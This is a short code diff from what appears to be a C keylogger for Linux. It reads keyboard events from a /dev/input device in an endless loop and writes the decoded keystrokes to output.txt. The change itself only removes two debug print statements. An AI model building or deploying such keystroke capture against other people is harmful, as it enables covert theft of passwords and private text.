@@ -94,7 +94,6 @@ void main()
   // open output text file to store decoded keystrokes
   FILE *output;
   output = fopen("output.txt", "w+");
-  printf("Opened\n");
 
   //open the eventX file that records keystrokes
   //char keyboardPath_EVENTUALLYREPLACE[] = "/dev/input/by-path/platform-i8042-serio-0-event-kbd";
@@ -109,7 +108,6 @@ void main()
 
   while(1)
   {
-    printf("LOOP");
     read(device, &inpEvent, sizeof(inpEvent));  
     //if the type of the event is a state change (like of a keyboard)
     if (inpEvent.type == 1 && inpEvent.value == 1)
